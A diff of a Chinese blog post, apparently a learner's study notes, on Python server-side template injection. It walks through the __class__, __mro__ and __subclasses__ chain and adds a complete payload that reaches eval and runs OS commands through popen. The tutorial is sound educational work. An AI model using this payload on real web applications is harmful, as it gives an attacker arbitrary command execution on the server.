@@ -193,7 +193,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>July 13, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1397</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1759</span>
     </div>
   </div>
 </section>
@@ -214,16 +214,23 @@
 
 <p>使用示例如下（前面的那个是两个单引号不是双引号，是一个啥都没有的字符串）</p>
 <p><img   class="lazyload" data-original="/images/SSTIstudy/image-20210713234537070.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>_<em>class</em>_ 魔术方法返回类型所属的对象，此处的字符串返回了str类</p>
 <p><img   class="lazyload" data-original="/images/SSTIstudy/image-20210713234659829.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>__mro__魔术方法返回str类的基类，再尝试用__subclasses__返回引用</p>
 <p><img   class="lazyload" data-original="/images/SSTIstudy/image-20210713235131026.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>可以看到通过不断通过对象的继承关系层层递进，到此处已经有这么多类，其中很可能有我们可以利用的类。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">num=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__())):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%d&quot;</span>%num,end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[i].__init__)<br>    num+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
+<p><img   class="lazyload" data-original="/images/SSTIstudy/image-20210714005539179.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>寻找重载过的init类（不含wrapper字样）</p>
 <p><img   class="lazyload" data-original="/images/SSTIstudy/image-20210714001332943.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
-<p>翻字典，眼尖的话应该已经看到eval了，我们试一下</p>
+<p>翻字典，眼尖的话应该已经看到eval了，接下来要干的事大家已经心知肚明了</p>
 <p><img   class="lazyload" data-original="/images/SSTIstudy/image-20210714003257685.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>可以看到成功执行了命令</p>
+<p>得到最终的payload：</p>
+<p><code>?s=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("the command you want to exec").read()')&#125;&#125;</code></p>
+<p>那此时实质上攻击者已经可以令服务器执行任意命令，攻陷服务器易如反掌</p>
+<p>基本上就是这样一个思路，通过不断利用魔术方法在类中跳转，寻找可以利用的关键函数</p>
 <h1 id="总结与感想"><a href="#总结与感想" class="headerlink" title="总结与感想"></a>总结与感想</h1><p>SSTI的payload不是一成不变的，不过理解原理之后结合脚本还是很容易能找出相应的payload的</p>
 <p>条条大路通罗马，同一道题也可能有多个payloads存在</p>
 <p>感觉对python这类面向对象的语言有了更进一步的认知，写脚本的能力也略微提升了一丶丶</p>
